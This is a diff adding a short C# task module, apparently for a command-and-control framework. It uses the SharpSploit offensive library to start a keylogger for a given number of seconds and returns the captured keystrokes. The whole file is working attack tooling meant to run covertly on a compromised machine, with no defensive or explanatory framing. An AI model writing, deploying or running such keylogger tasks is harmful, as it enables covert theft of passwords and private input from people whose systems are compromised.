@@ -1,0 +1,21 @@
+using System;
+
+using System.Timers;
+using SharpSploit.Enumeration;
+
+public static class Task
+{
+	public static string Execute(string interval = "60"){
+		try
+		{
+			int time = int.Parse(interval);
+			string results = Keylogger.StartKeylogger(time);
+			return results;
+		}
+		catch (Exception e)
+		{
+			return "An error occured while starting the keylogger: " + e.Message;
+		}
+	}
+}
+
